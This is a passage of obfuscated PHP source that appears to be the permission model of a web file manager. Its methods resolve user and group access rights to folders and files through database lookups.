($¡ª¬êÛÏ[$¼¶Òû‡ò[2016]] as $Öü©‘üÌ) { $ì©„Œ÷Ì = $Öü©‘üÌ[$¼¶Òû‡ò[467]]; $®ÍÏ«Şş = $Öü©‘üÌ[$¼¶Òû‡ò[1664]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‚–æ‰¦ = $Öü©‘üÌ[$¼¶Òû‡ò[1664]] ? $Öü©‘üÌ[$¼¶Òû‡ò[1664]] : $Öü©‘üÌ[$¼¶Òû‡ò[1836]]; if ($Öü©‘üÌ[$¼¶Òû‡ò[1664]] && $Öü©‘üÌ[$¼¶Òû‡ò[1664]] == $İš©õÄë) { continue; } $×ŞşË[] = array($¼¶Òû‡ò[402] => $¡ª¬êÛÏ[$¼¶Òû‡ò[402]], $¼¶Òû‡ò[411] => $®ÍÏ«Şş, $¼¶Òû‡ò[505] => intval($‚–æ‰¦), $¼¶Òû‡ò[1940] => isset($ì©„Œ÷Ì[$¼¶Òû‡ò[399]]) ? intval($ì©„Œ÷Ì[$¼¶Òû‡ò[399]]) : 0, $¼¶Òû‡ò[1996] => isset($ì©„Œ÷Ì[$¼¶Òû‡ò[1996]]) ? intval($ì©„Œ÷Ì[$¼¶Òû‡ò[1996]]) : -1); } $×ŞşË[] = array($¼¶Òû‡ò[402] => $¡ª¬êÛÏ[$¼¶Òû‡ò[402]], $¼¶Òû‡ò[411] => SourceModel::TYPE_USER, $¼¶Òû‡ò[505] => intval($İš©õÄë), $¼¶Òû‡ò[1940] => intval($¾ïÀˆŠ´), $¼¶Òû‡ò[1996] => -1); $this->where(array($¼¶Òû‡ò[417] => $¡ª¬êÛÏ[$¼¶Òû‡ò[402]]))->delete(); $this->addAll($×ŞşË); } return !0; } public function get($ÙŞ¶ØÚ) { $íÏ¼´ç = $this->getSourceList(array($ÙŞ¶ØÚ), !0); return $íÏ¼´ç[0]; } public function getSourceList($Ö­†‹£, $…Ñ»¤ = false, $É”Ãà˜± = false) { $¸ì­²Íİ =& $_SERVER[ñˆ‹ß¿÷]; if (!$Ö­†‹£) { return array(); } $™ÄšüÔö = Model($¸ì­²Íİ[1334]); if (!$…Ñ»¤ && count($Ö­†‹£) == 1) { $…Ñ»¤ = array(); $…Ñ»¤[$Ö­†‹£[0]] = $™ÄšüÔö->sourceInfo($Ö­†‹£[0]); } if (!$…Ñ»¤) { $¥±«€²» = array($¸ì­²Íİ[417] => array($¸ì­²Íİ[418], $Ö­†‹£)); $…Ñ»¤ = $™ÄšüÔö->field($¸ì­²Íİ[2020])->where($¥±«€²»)->select(); $…Ñ»¤ = array_to_keyvalue($…Ñ»¤, $¸ì­²Íİ[402]); } $ôÚ˜™ÙÜ = $Ö­†‹£; foreach ($…Ñ»¤ as $“ØÀ…èÃ => $ÏõÍÙ€ñ) { $ìÕ–©º = $™ÄšüÔö->parentLevelArray($ÏõÍÙ€ñ[$¸ì­²Íİ[521]]); $ôÚ˜™ÙÜ = array_merge($ôÚ˜™ÙÜ, array($“ØÀ…èÃ), array_reverse($ìÕ–©º)); } $ôÚ˜™ÙÜ = array_values(array_unique($ôÚ˜™ÙÜ)); if (!$ôÚ˜™ÙÜ) { return array(); } $¼á±ü‰€ = $this->sourceAuthSelect($ôÚ˜™ÙÜ); $—ê‡şÍœ = array(); foreach ($ôÚ˜™ÙÜ as $™Ç½¨×«) { if (isset($¼á±ü‰€[$™Ç½¨×«])) { $—ê‡şÍœ[$™Ç½¨×«] = $¼á±ü‰€[$™Ç½¨×«]; } } $ÕÑ‹œº = $this->userIsRoot($É”Ãà˜±); $‹¡Èßö¤ = AuthModel::authAll(); $’í¸¼ñ­ = array($¸ì­²Íİ[414] => $‹¡Èßö¤, $¸ì­²Íİ[2021] => array($¸ì­²Íİ[419] => 0, $¸ì­²Íİ[1842] => $‹¡Èßö¤, $¸ì­²Íİ[420] => LNG($¸ì­²Íİ[2022]), $¸ì­²Íİ[1859] => $¸ì­²Íİ[2023])); $™ƒóüìÌ = array(); foreach ($…Ñ»¤ as $™Ç½¨×« => $©‘«ìĞ–) { if ($ÕÑ‹œº && $GLOBALS[$¸ì­²Íİ[6]][$¸ì­²Íİ[1855]]) { $™ƒóüìÌ[$™Ç½¨×«] = $’í¸¼ñ­; continue; } $™ƒóüìÌ[$™Ç½¨×«] = $this->makeSourceAuth($©‘«ìĞ–, $—ê‡şÍœ, $É”Ãà˜±); } return $™ƒóüìÌ; } public function authDeepCheck($ƒ±ÅĞ¤, $ù®À¥êÙ = false) { $¤Ò†À› =& $_SERVER[ñˆ‹ß¿÷]; $ù®À¥êÙ = $ù®À¥êÙ ? $ù®À¥êÙ : USER_ID; $•Íá®ÁŒ = $this->makeAuthDeep($ù®À¥êÙ); if (!in_array($ƒ±ÅĞ¤, $•Íá®ÁŒ[$¤Ò†À›[2024]])) { return !1; } $åíå½ë = array(); foreach ($•Íá®ÁŒ[$¤Ò†À›[2025]] as $¯«­ùÁ£ => $†åáô½ß) { if (!in_array($ƒ±ÅĞ¤, $†åáô½ß)) { continue; } $åíå½ë[] = $¯«­ùÁ£; } if (!$åíå½ë) { return !1; } $£»ÛÀâ÷ = $åíå½ë ? $åíå½ë[0] : $ƒ±ÅĞ¤; return array($¤Ò†À›[414] => -1, $¤Ò†À›[467] => array($¤Ò†À›[419] => $¤Ò†À›[1197], $¤Ò†À›[1842] => $¤Ò†À›[197], $¤Ò†À›[420] => LNG($¤Ò†À›[2026]), $¤Ò†À›[1859] => $¤Ò†À›[2027]), $¤Ò†À›[2028] => LNG($¤Ò†À›[2029]), $¤Ò†À›[2030] => $this->sourceAuthInfo($£»ÛÀâ÷)); } protected function makeAuthDeep($ø“ìÎºª = false) { $éôà¨– =& $_SERVER[ñˆ‹ß¿÷]; static $³Ûªàıä = array(); $ø“ìÎºª = $ø“ìÎºª ? $ø“ìÎºª : USER_ID; if (isset($³Ûªàıä[$ø“ìÎºª])) { return $³Ûªàıä[$ø“ìÎºª]; } $§ùó´û¬ = Model($éôà¨–[2031])->listData(); $äÈù´ÕÏ = array(); foreach ($§ùó´û¬ as $°Çä­ „) { if ($°Çä­ „[$éôà¨–[413]] == 0 && $°Çä­ „[$éôà¨–[1858]] == $éôà¨–[88]) { $äÈù´ÕÏ[] = $°Çä­ „[$éôà¨–[399]]; } } $Ì¸Í¿íÌ = $this->userGroupParents($ø“ìÎºª); $‚ÍÈá—ì = array($éôà¨–[411] => SourceModel::TYPE_USER, $éôà¨–[505] => $ø“ìÎºª); if ($Ì¸Í¿íÌ) { $‚ÍÈá—ì = array(array($éôà¨–[411] => SourceModel::TYPE_USER, $éôà¨–[505] => $ø“ìÎºª), array($éôà¨–[411] => SourceModel::TYPE_GROUP, $éôà¨–[505] => array($éôà¨–[418], $Ì¸Í¿íÌ)), $éôà¨–[1007] => $éôà¨–[1934]); } $äĞ³Ğüç = $this->field($éôà¨–[2032])->where($‚ÍÈá—ì)->select(); $ü¡€½íğ = array(); $ìàœú¯Â = array_to_keyvalue_group($äĞ³Ğüç, $éôà¨–[402]); foreach ($ìàœú¯Â as $¥†åëñÇ => $Åşó‚ØÉ) { $®’äÀ¨€ = $this->authArrayCheck($Åşó‚ØÉ, $ø“ìÎºª); if ($®’äÀ¨€[$éôà¨–[414]] > 0) { $ü¡€½íğ[] = $¥†åëñÇ . $éôà¨–[12]; } } if ($Ì¸Í¿íÌ) { $Ù›èÃ = Model($éôà¨–[522]); foreach ($Ì¸Í¿íÌ as $…Î«úâ¥) { $ÅªÏõ· = $Ù›èÃ->getInfo($…Î«úâ¥); if (!$ÅªÏõ· || !is_array($ÅªÏõ·[$éôà¨–[86]])) { continue; } $ü¡€½íğ[] = $ÅªÏõ·[$éôà¨–[86]][$éôà¨–[402]]; } } $ÅŠ»şä¸ = array(); $ŠÔ™±òá = $Ì¸Í¿íÌ; $¶îß½³• = Model($éôà¨–[1334]); $Ù›èÃ = Model($éôà¨–[522]); $Àåõ¦É† = array(); $†ğ¤™Å€ = array(); $”¦»Ñô¸ = array(); $ØŠ€ñê½ = array(); if ($ü¡€½íğ) { $ŸàïÕÏ = $¶îß½³•->where(array($éôà¨–[402] => array($éôà¨–[418], $ü¡€½íğ)))->select(); foreach ($ŸàïÕÏ as $·ùª÷€½) { $©¶ÄÄ°ñ = $¶îß½³•->parentLevelArray($·ùª÷€½[$éôà¨–[521]]); $ÅŠ»şä¸ = array_merge($ÅŠ»şä¸, $©¶ÄÄ°ñ); $ŠÔ™±òá[] = $·ùª÷€½[$éôà¨–[505]]; $Àåõ¦É†[$·ùª÷€½[$éôà¨–[402]]] = $©¶ÄÄ°ñ; $†ğ¤™Å€[$·ùª÷€½[$éôà¨–[402]]] = $·ùª÷€½[$éôà¨–[505]]; } } $ŠÔ™±òá = array_values(array_unique($ŠÔ™±òá)); $×Ã´Ù†³ = $ŠÔ™±òá; foreach ($×Ã´Ù†³ as $…Î«úâ¥) { $ÅªÏõ· = $Ù›èÃ->getInfo($…Î«úâ¥); $©¶ÄÄ°ñ = $¶îß½³•->parentLevelArray($ÅªÏõ·[$éôà¨–[521]]); $ŠÔ™±òá = array_merge($ŠÔ™±òá, $©¶ÄÄ°ñ); } $ŠÔ™±òá = array_values(array_unique($ŠÔ™±òá)); foreach ($ŠÔ™±òá as $…Î«úâ¥) { $ÅªÏõ· = $Ù›èÃ->getInfo($…Î«úâ¥); $ÅŠ»şä¸[] = $ÅªÏõ·[$éôà¨–[86]][$éôà¨–[402]]; $”¦»Ñô¸[$…Î«úâ¥] = $ÅªÏõ·[$éôà¨–[86]][$éôà¨–[402]]; $ØŠ€ñê½[$…Î«úâ¥] = $¶îß½³•->parentLevelArray($ÅªÏõ·[$éôà¨–[521]]); } foreach ($Àåõ¦É† as $Ãˆ´Ğ¹ => $¾ç»â®) { $€™Õ‘Ÿ§ = $†ğ¤™Å€[$Ãˆ´Ğ¹]; if (!$€™Õ‘Ÿ§ || !$”¦»Ñô¸[$€™Õ‘Ÿ§]) { continue; } $ßï£Ñ• = array(); foreach ($ØŠ€ñê½[$€™Õ‘Ÿ§] as $…Î«úâ¥) { $ßï£Ñ•[] = $”¦»Ñô¸[$…Î«úâ¥]; } $Àåõ¦É†[$Ãˆ´Ğ¹] = array_merge($ßï£Ñ•, $¾ç»â®); } $ÅŠ»şä¸ = array_values(array_unique($ÅŠ»şä¸)); $ŒşÈ°¶Ö = array($éôà¨–[2024] => $ÅŠ»şä¸, $éôà¨–[2025] => $Àåõ¦É†); $³Ûªàıä[$ø“ìÎºª] = $ŒşÈ°¶Ö; return $ŒşÈ°¶Ö; } private function makeSourceAuth($ò¹•ğÃÓ, $ÁøËÀˆÚ, $Î’¡ŠÈƒ = false) { $íù©¡Ã‹ =& $_SERVER[ñˆ‹ß¿÷]; $Œ¶±£ÀÊ = $íù©¡Ã‹[88]; $˜›ŸĞÃ = $ò¹•ğÃÓ[$íù©¡Ã‹[505]]; $…ÊçÚÇ = $ò¹•ğÃÓ[$íù©¡Ã‹[411]] == SourceModel::TYPE_GROUP; $ô¹™‹öò = $…ÊçÚÇ ? $this->groupRootAuth($˜›ŸĞÃ, $Î’¡ŠÈƒ) : !1; if ($ô¹™‹öò && Model($íù©¡Ã‹[507])->authCheckAction($ô¹™‹öò[$íù©¡Ã‹[413]], $íù©¡Ã‹[1857])) { return $this->groupAuthInfo($ô¹™‹öò, $˜›ŸĞÃ); } $®Ÿ¹›Ù™ = Model($íù©¡Ã‹[1334])->parentLevelArray($ò¹•ğÃÓ[$íù©¡Ã‹[521]]); $®Ÿ¹›Ù™ = array_merge(array($ò¹•ğÃÓ[$íù©¡Ã‹[402]]), array_reverse($®Ÿ¹›Ù™)); $Êñ±ÑÜ« = !1; foreach ($®Ÿ¹›Ù™ as $¹ÉÎ—ÜŸ) { if (!isset($ÁøËÀˆÚ[$¹ÉÎ—ÜŸ])) { continue; } $Ï›˜÷™ = $this->authMake($ÁøËÀˆÚ[$¹ÉÎ—ÜŸ], $Î’¡ŠÈƒ); if ($Ï›˜÷™[$íù©¡Ã‹[467]]) { $Êñ±ÑÜ« = $Ï›˜÷™; break; } } if (!$…ÊçÚÇ) { return $Êñ±ÑÜ«; } if (!$Êñ±ÑÜ« && $ô¹™‹öò) { $Êñ±ÑÜ« = $this->groupAuthInfo($ô¹™‹öò, $˜›ŸĞÃ); } if (!$Êñ±ÑÜ«) { $„±•ø˜æ = Model($íù©¡Ã‹[522])->getInfo($˜›ŸĞÃ); $âÇ‘»ßü = explode($íù©¡Ã‹[50], trim($„±•ø˜æ[$íù©¡Ã‹[521]], $íù©¡Ã‹[50])); $âÇ‘»ßü = array_reverse($âÇ‘»ßü); foreach ($âÇ‘»ßü as $ÉÌ—›’Œ) { if ($ÉÌ—›’Œ == $íù©¡Ã‹[197] || $ÉÌ—›’Œ == $Œ¶±£ÀÊ) { continue; } $Í´×¯¨ã = $this->groupRootAuth($ÉÌ—›’Œ, $Î’¡ŠÈƒ); if (!$Í´×¯¨ã) { continue; } $Êñ±ÑÜ« = $this->groupAuthInfo($Í´×¯¨ã, $ÉÌ—›’Œ); break; } } if (!$Êñ±ÑÜ« || $Êñ±ÑÜ«[$íù©¡Ã‹[414]] <= 0) { $°¯ÒÑ»± = $this->authDeepCheck($ò¹•ğÃÓ[$íù©¡Ã‹[402]], $Î’¡ŠÈƒ); if ($°¯ÒÑ»±) { $Êñ±ÑÜ« = $°¯ÒÑ»±; } } return $Êñ±ÑÜ«; } private function userIsRoot($¤¦¡©ªí = false) { $ÏäÆÌ‚± =& $_SERVER[ñˆ‹ß¿÷]; if (!$¤¦¡©ªí && _get($GLOBALS, $ÏäÆÌ‚±[503])) { return !0; } $ÄÀ‹–“ = Model($ÏäÆÌ‚±[535])->getInfo($¤¦¡©ªí); $ÔÇÌ¿ıï = Model($ÏäÆÌ‚±[2033])->listData($ÄÀ‹–“[$ÏäÆÌ‚±[1543]]); if ($ÔÇÌ¿ıï && $ÔÇÌ¿ıï[$ÏäÆÌ‚±[511]][$ÏäÆÌ‚±[2034]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ìËÕ±õŸ) { $ıõÄê‹æ =& $_SERVER[ñˆ‹ß¿÷]; $·ˆ÷ù”Ã = Model($ıõÄê‹æ[1334]); $©“¤ˆÒ‘ = $·ˆ÷ù”Ã->sourceInfo($ìËÕ±õŸ); if (!$©“¤ˆÒ‘) { return !1; } $·ˆ÷ù”Ã->groupPathDisplay($©“¤ˆÒ‘); $ÏÉÌğü = array($©“¤ˆÒ‘); $ÏÉÌğü = $·ˆ÷ù”Ã->_listAppendPath($ÏÉÌğü); $©“¤ˆÒ‘ = $ÏÉÌğü[0]; $ÁüÀ³²© = $©“¤ˆÒ‘[$ıõÄê‹æ[519]]; if (isset($©“¤ˆÒ‘[$ıõÄê‹æ[527]])) { $–¹ÎÎƒ = explode($ıõÄê‹æ[8], trim($©“¤ˆÒ‘[$ıõÄê‹æ[519]], $ıõÄê‹æ[8])); array_shift($–¹ÎÎƒ); $ÁüÀ³²© = $©“¤ˆÒ‘[$ıõÄê‹æ[525]] . $ıõÄê‹æ[2035] . implode($ıõÄê‹æ[8], $–¹ÎÎƒ); } return array($ıõÄê‹æ[420] => $©“¤ˆÒ‘[$ıõÄê‹æ[32]], $ıõÄê‹æ[84] => KodIO::make($©“¤ˆÒ‘[$ıõÄê‹æ[402]]), $ıõÄê‹æ[2036] => $ÁüÀ³²©); } private function groupAuthInfo($›„ÅÌ¥, $»ìûî—Å) { $ÉÇÇŠ´è =& $_SERVER[ñˆ‹ß¿÷]; $‘ƒäç¹ = Model($ÉÇÇŠ´è[522])->getInfo($»ìûî—Å); return array($ÉÇÇŠ´è[2037] => intval($›„ÅÌ¥[$ÉÇÇŠ´è[413]]), $ÉÇÇŠ´è[2021] => $›„ÅÌ¥, $ÉÇÇŠ´è[2038] => LNG($ÉÇÇŠ´è[2039]), $ÉÇÇŠ´è[2030] => array($ÉÇÇŠ´è[420] => $‘ƒäç¹[$ÉÇÇŠ´è[32]], $ÉÇÇŠ´è[84] => KodIO::make($‘ƒäç¹[$ÉÇÇŠ´è[86]][$ÉÇÇŠ´è[402]]), $ÉÇÇŠ´è[2036] => $‘ƒäç¹[$ÉÇÇŠ´è[526]])); } protected function groupRootAuth($ÑÓªÎ‰·, $¯Ø…‰¥Æ = false) { $³Å ŸÍ =& $_SERVER[ñˆ‹ß¿÷]; $¯Ø…‰¥Æ = $¯Ø…‰¥Æ ? $¯Ø…‰¥Æ : USER_ID; $¥ª™™Ş‘ = $¯Ø…‰¥Æ . $³Å ŸÍ[2040] . $ÑÓªÎ‰·; static $ò˜õÇÜ· = array(); if (isset($ò˜õÇÜ·[$¥ª™™Ş‘])) { return $ò˜õÇÜ·[$¥ª™™Ş‘]; } $”ÊË†€ó = Model($³Å ŸÍ[522])->getInfo($ÑÓªÎ‰·); $Û˜ïÌâ = $this->userGroupList($¯Ø…‰¥Æ); $±öÃû—™ = isset($Û˜ïÌâ[$ÑÓªÎ‰·]) ? $Û˜ïÌâ[$ÑÓªÎ‰·][$³Å ŸÍ[413]] : !1; if ($±öÃû—™ && Model($³Å ŸÍ[507])->authCheckAction($±öÃû—™[$³Å ŸÍ[413]], $³Å ŸÍ[1857])) { $ò˜õÇÜ·[$¥ª™™Ş‘] = $±öÃû—™; return $±öÃû—™; } $ƒïÔˆì˜ = $this->sourceAuthSelect($”ÊË†€ó[$³Å ŸÍ[86]][$³Å ŸÍ[402]]); $”ÒÖ·²§ = $ƒïÔˆì˜ ? $this->authMake($ƒïÔˆì˜, $¯Ø…‰¥Æ) : !1; $‹˜“¥à = $”ÒÖ·²§ ? $”ÒÖ·²§[$³Å ŸÍ[467]] : !1; $ò˜õÇÜ·[$¥ª™™Ş‘] = $‹˜“¥à ? $‹˜“¥à : $±öÃû—™; return $ò˜õÇÜ·[$¥ª™™Ş‘]; } public function authOwnerApply($Üì¯¢¬ó) { $ø›Å¶à… =& $_SERVER[ñˆ‹ß¿÷]; if (empty($Üì¯¢¬ó[$ø›Å¶à…[413]]) || isset($Üì¯¢¬ó[$ø›Å¶à…[2041]]) && $Üì¯¢¬ó[$ø›Å¶à…[2041]]) { return $Üì¯¢¬ó; } if (AuthModel::authCheckRoot($Üì¯¢¬ó[$ø›Å¶à…[413]][$ø›Å¶à…[414]])) { return $Üì¯¢¬ó; } $­ü™— = Model($ø›Å¶à…[1334])->parentLevelArray($Üì¯¢¬ó[$ø›Å¶à…[521]]); $­ü™— = array_merge(array($Üì¯¢¬ó[$ø›Å¶à…[402]]), array_reverse($­ü™—)); $†îçè­À = $this->sourceAuthSelect($­ü™—); $ê¸…÷¬ = array(); $Àáµ¾¿¬ = array(); foreach ($†îçè­À as $ó£ø—Á£ => $¥ûÕ‘„í) { $ê«á‘ñ = $this->authFolderOwnerUser($¥ûÕ‘„í); $ê¸…÷¬[$ó£ø—Á£] = $ê«á‘ñ; $Àáµ¾¿¬ = array_merge($Àáµ¾¿¬, $ê«á‘ñ[$ø›Å¶à…[600]]); if ($ê«á‘ñ[$ø›Å¶à…[2042]]) { break; } } if (count($Àáµ¾¿¬) == 0) { $Àáµ¾¿¬ = $this->authFolderOwnerGroup($Üì¯¢¬ó[$ø›Å¶à…[505]]); } $Àáµ¾¿¬ = array_unique($Àáµ¾¿¬); if (AuthModel::authCheckRoot($Üì¯¢¬ó[$ø›Å¶à…[413]][$ø›Å¶à…[414]])) { $Àáµ¾¿¬[] = USER_ID; } $Üì¯¢¬ó[$ø›Å¶à…[413]][$ø›Å¶à…[2043]] = Model($ø›Å¶à…[513])->userListInfo($Àáµ¾¿¬); return $Üì¯¢¬ó; } private function authFolderOwnerGroup($²Ñîö Ğ) { $©ÚôÌÄâ =& $_SERVER[ñˆ‹ß¿÷]; $Ùªø¥› = Model($©ÚôÌÄâ[1926])->where(array($©ÚôÌÄâ[1836] => $²Ñîö Ğ))->select(); $Êá¶ùôÕ = array(); if (!$Ùªø¥›) { return $Êá¶ùôÕ; } foreach ($Ùªø¥› as $Ğ ÓÍã˜) { $í¼ŠÅÂÅ = $this->authInfo($Ğ ÓÍã˜); if (AuthModel::authCheckRoot($í¼ŠÅÂÅ[$©ÚôÌÄâ[413]])) { $Êá¶ùôÕ[] = $Ğ ÓÍã˜[$©ÚôÌÄâ[1664]]; } } return $Êá¶ùôÕ; } private function authFolderOwnerUser($®İ·¬ıÑ) { $òÎÁäÄË =& $_SERVER[ñˆ‹ß¿÷]; $£«ˆáÄ‡ = array(); $ûˆŸÚîé = !1; foreach ($®İ·¬ıÑ as $ºØÉšøü) { $·ä¨€‹ = $this->authInfo($ºØÉšøü); if ($ºØÉšøü[$òÎÁäÄË[505]] == $òÎÁäÄË[197]) { $ûˆŸÚîé = !0; } if ($ºØÉšøü[$òÎÁäÄË[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($·ä¨€‹[$òÎÁäÄË[413]])) { $£«ˆáÄ‡[] = $ºØÉšøü[$òÎÁäÄË[505]]; } } } return array($òÎÁäÄË[600] => $£«ˆáÄ‡, $òÎÁäÄË[2042] => $ûˆŸÚîé); } public function authMake($šÅÏ¤ª›, $ñú³™ú = false) { $è¹ìŸ‰ =& $_SERVER[ñˆ‹ß¿÷]; $ÖÊö‰¥é = $this->authArrayCheck($šÅÏ¤ª›, $ñú³™ú); if ($ÖÊö‰¥é[$è¹ìŸ‰[2044]]) { $ÖÊö‰¥é[$è¹ìŸ‰[2044]] = $this->sourceAuthInfo($ÖÊö‰¥é[$è¹ìŸ‰[2044]]); } return $ÖÊö‰¥é; } public function authArrayCheck($²ñÓ÷ØÄ, $ëîíıÄÜ = false) { $óĞ¿æ„ù =& $_SERVER[ñˆ‹ß¿÷]; if (!$²ñÓ÷ØÄ) { return array($óĞ¿æ„ù[414] => 0, $óĞ¿æ„ù[467] => !1); } $ëîíıÄÜ = $ëîíıÄÜ ? $ëîíıÄÜ : USER_ID; $øí¬¼·² = 0; $Ğş»Şé¤ = 0; $±œ¼•ìĞ = 0; $äó­¢¹ë = 0; $¿»ÅÏ¿ƒ = 0; $Ğö‡›–ˆ = 0; $½šË’ç— = 1000; $Ó¦«Ë¥• = 0; $³ğÎÉ´¸ = 0; $¥®óÇÓ÷ = 0; $ËÄÎ‘«õ = 0; $‰Ìó§Êß = array($óĞ¿æ„ù[402] => 0); foreach ($²ñÓ÷ØÄ as $‰Ìó§Êß) { $ßÑÜ‹ä = $this->authInfo($‰Ìó§Êß); if (!$ßÑÜ‹ä) { continue; } $—ÏĞİñÌ = $‰Ìó§Êß[$óĞ¿æ„ù[505]]; $ŠèÒõµÙ = intval($ßÑÜ‹ä[$óĞ¿æ„ù[413]]); if ($‰Ìó§Êß[$óĞ¿æ„ù[411]] == SourceModel::TYPE_USER && $—ÏĞİñÌ == $ëîíıÄÜ) { $øí¬¼·² = !0; $±œ¼•ìĞ = $ßÑÜ‹ä; $Ğş»Şé¤ = $ŠèÒõµÙ; } else { if ($‰Ìó§Êß[$óĞ¿æ„ù[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($—ÏĞİñÌ, $ëîíıÄÜ)) { $äó­¢¹ë = !0; $í‹–º = $this->groupStepToUserGroup($—ÏĞİñÌ, $ëîíıÄÜ); if ($í‹–º < $½šË’ç—) { $½šË’ç— = $í‹–º; $¿»ÅÏ¿ƒ = $ŠèÒõµÙ; $Ğö‡›–ˆ = $ßÑÜ‹ä; $Ó¦«Ë¥• = $—ÏĞİñÌ; } if ($í‹–º == $½šË’ç— && $ŠèÒõµÙ >= $¿»ÅÏ¿ƒ) { $¿»ÅÏ¿ƒ = $ŠèÒõµÙ; $Ğö‡›–ˆ = $ßÑÜ‹ä; $Ó¦«Ë¥• = $—ÏĞİñÌ; } } else { if ($—ÏĞİñÌ == $óĞ¿æ„ù[197]) { $³ğÎÉ´¸ = !0; $ËÄÎ‘«õ = $ßÑÜ‹ä; $¥®óÇÓ÷ = $ŠèÒõµÙ; } } } } if ($øí¬¼·²) { $›ñ¢ßª = $Ğş»Şé¤; $ßÑÜ‹ä = $±œ¼•ìĞ; $±Øãçö› = LNG($óĞ¿æ„ù[2045]); } else { if ($äó­¢¹ë) { $›ñ¢ßª = $¿»ÅÏ¿ƒ; $ßÑÜ‹ä = $Ğö‡›–ˆ; $ş³àÜé¸ = Model($óĞ¿æ„ù[522])->getInfo($Ó¦«Ë¥•); $±Øãçö› = $óĞ¿æ„ù[162] . $ş³àÜé¸[$óĞ¿æ„ù[526]] . $óĞ¿æ„ù[2046] . LNG($óĞ¿æ„ù[2047]); } else { if ($³ğÎÉ´¸) { $›ñ¢ßª = $¥®óÇÓ÷; $ßÑÜ‹ä = $ËÄÎ‘«õ; $±Øãçö› = LNG($óĞ¿æ„ù[2018]); } else { $›ñ¢ßª = 0; $ßÑÜ‹ä = !1; $±Øãçö› = $óĞ¿æ„ù[12]; } } } $‹Ñ¡¡À = array($óĞ¿æ„ù[2037] => intval($›ñ¢ßª), $óĞ¿æ„ù[2021] => $ßÑÜ‹ä, $óĞ¿æ„ù[2038] => $±Øãçö›, $óĞ¿æ„ù[2030] => $‰Ìó§Êß[$óĞ¿æ„ù[402]]); return $‹Ñ¡¡À; } private function groupContainUser($Øå˜“™š, $‡ Î›‰ó = false) { return in_array($Øå˜“™š, $this->userGroupParents($‡ Î›‰ó)); } private function groupStepToUserGroup($ØêİÑÚ‚, $Õ†Ç•ßÓ = false) { $‘†ú£å =& $_SERVER[ñˆ‹ß¿÷]; $öÇñŸÁÄ = $this->userGroupList($Õ†Ç•ßÓ); $Ù§ùñ‚ = 1000; $¯‰ï­Æ = $GLOBALS[$‘†ú£å[6]][$‘†ú£å[89]][$‘†ú£å[1939]] == 1; $¼…™Å©™ = $¯‰ï­Æ ? 3 : 2; foreach ($öÇñŸÁÄ as $ºæ¸¯ä§) { if ($ºæ¸¯ä§[$‘†ú£å[1836]] == $ØêİÑÚ‚) { return 0; } $ü£ìû²â = explode($‘†ú£å[50], trim($ºæ¸¯ä§[$‘†ú£å[521]], $‘†ú£å[50])); if ($ü£ìû²â[0] == $‘†ú£å[197] && count($ü£ìû²â) > $¼…™Å©™) { $¡ˆæÏÌ¬ = array_reverse(array_slice($ü£ìû²â, $¼…™Å©™)); $ŒàÑã‰„ = array_search($ØêİÑÚ‚, $¡ˆæÏÌ¬); if ($ŒàÑã‰„ !== !1 && $ŒàÑã‰„ + 1 <= $Ù§ùñ‚) { $Ù§ùñ‚ = $ŒàÑã‰„ + 1; } } } return $Ù§ùñ‚; } private function userGroupList($˜×Ğš¯û = false) { $§£÷¤ûÍ =& $_SERVER[ñˆ‹ß¿÷]; static $™Ğã±õ® = array(); if (isset($™Ğã±õ®[$˜×Ğš¯û])) { return $™Ğã±õ®[$˜×Ğš¯û]; } $µ“å’Ş¯ = Model($§£÷¤ûÍ[535])->getInfo($˜×Ğš¯û); $™Ğã±õ®[$˜×Ğš¯û] = array_to_keyvalue($µ“å’Ş¯[$§£÷¤ûÍ[2019]], $§£÷¤ûÍ[1836]); return $™Ğã±õ®[$˜×Ğš¯û]; } public function userGroupParents($ºñÈã‰È) { $Ğ¯ûŸ¿ =& $_SERVER[ñˆ‹ß¿÷]; static $õğËÓÇ½ = array(); $ºñÈã‰È = $ºñÈã‰È ? $ºñÈã‰È : USER_ID; if (isset($õğËÓÇ½[$ºñÈã‰È])) { return $õğËÓÇ½[$ºñÈã‰È]; } $“Ì·µ’¤ = $this->userGroupList($ºñÈã‰È); $¤ÔÄ‡“ü = array(); $‚Ü™…¸È = $GLOBALS[$Ğ¯ûŸ¿[6]][$Ğ¯ûŸ¿[89]][$Ğ¯ûŸ¿[1939]] == 1; $ìàÜàÎ‚ = $‚Ü™…¸È ? 3 : 2; foreach ($“Ì·µ’¤ as $šöÜŒíº) { $ÖÚ°ÒŠâ = array($šöÜŒíº[$Ğ¯ûŸ¿[1836]]); $Ü›³¨èº = explode($Ğ¯ûŸ¿[50], trim($šöÜŒíº[$Ğ¯ûŸ¿[521]], $Ğ¯ûŸ¿[50])); if ($Ü›³¨èº[0] == $Ğ¯ûŸ¿[197] && count($Ü›³¨èº) > $ìàÜàÎ‚) { $óÂÁË’İ = array_slice($Ü›³¨èº, $ìàÜàÎ‚); $ÖÚ°ÒŠâ = array_merge($ÖÚ°ÒŠâ, array_reverse($óÂÁË’İ)); } $¤ÔÄ‡“ü = array_merge($¤ÔÄ‡“ü, $ÖÚ°ÒŠâ); } $õğËÓÇ½[$ºñÈã‰È] = array_unique($¤ÔÄ‡“ü); return $õğËÓÇ½[$ºñÈã‰È]; } public function authTargetInfoMake($Ş•¨ñ‚) { $—¸ùæú… =& $_SERVER[ñˆ‹ß¿÷]; $²¤ëé¨ = array(); $ØÓÎ±çÍ = array(); foreach ($Ş•¨ñ‚ as $õÄùÌæş) { if ($õÄùÌæş[$—¸ùæú…[411]] == SourceModel::TYPE_USER) { $²¤ëé¨[] = intval($õÄùÌæş[$—¸ùæú…[505]]); } else { if ($õÄùÌæş[$—¸ùæú…[411]] == SourceModel::TYPE_GROUP) { $ØÓÎ±çÍ[] = intval($õÄùÌæş[$—¸ùæú…[505]]); } } } if ($²¤ëé¨) { $²¤ëé¨ = Model($—¸ùæú…[513])->userListInfo($²¤ëé¨); } if ($ØÓÎ±çÍ) { $Æà€±•” = array($—¸ùæú…[1924] => array($—¸ùæú…[418], $ØÓÎ±çÍ)); $ØÓÎ±çÍ = Model($—¸ùæú…[522])->field($—¸ùæú…[2048])->where($Æà€±•”)->select(); $ØÓÎ±çÍ = array_to_keyvalue($ØÓÎ±çÍ, $—¸ùæú…[1836]); } return array($—¸ùæú…[2049] => $²¤ëé¨, $—¸ùæú…[2050] => $ØÓÎ±çÍ); } public function authInfo($üÈ‰İ Õ) { 